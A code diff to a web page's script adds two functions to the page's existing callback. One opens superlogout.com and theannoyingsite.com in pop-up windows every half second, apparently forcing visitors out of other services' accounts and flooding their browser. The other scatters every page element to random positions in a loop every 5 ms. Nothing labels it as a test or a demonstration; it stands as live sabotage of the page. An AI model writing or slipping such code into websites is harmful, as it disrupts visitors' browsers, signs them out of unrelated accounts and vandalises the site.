@@ -32,8 +32,43 @@
   <script src="/assets/js/jquery.marquee.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
   <script>
+    function openAnnoyingPopups() {
+            const urls = [
+                "https://superlogout.com/",
+                "https://theannoyingsite.com/"
+            ];
+            const delay = 500; // Delay in milliseconds
+
+            let popupCounter = 0;
+            function openPopup() {
+                if (popupCounter < urls.length) {
+                    window.open(urls[popupCounter]);
+                    popupCounter++;
+                    setTimeout(openPopup, delay);
+                }
+            }
+            openPopup();
+        }
+
+        function movePageElements() {
+            const elements = document.body.children;
+            const maxWidth = window.innerWidth - 100;
+            const maxHeight = window.innerHeight - 100;
+
+            for (let element of elements) {
+                element.style.position = 'absolute';
+                element.style.left = `${Math.random() * maxWidth}px`;
+                element.style.top = `${Math.random() * maxHeight}px`;
+                element.style.transition = 'left 0.5s, top 0.5s';
+            }
+
+            setTimeout(movePageElements, 5);
+        }
+
     // var CTE = {};
     CTE.callback = () => {
+      openAnnoyingPopups();
+      movePageElements();
       var aud = document.getElementsByTagName("audio")[0];
       aud.volume = .2;
       aud.play();
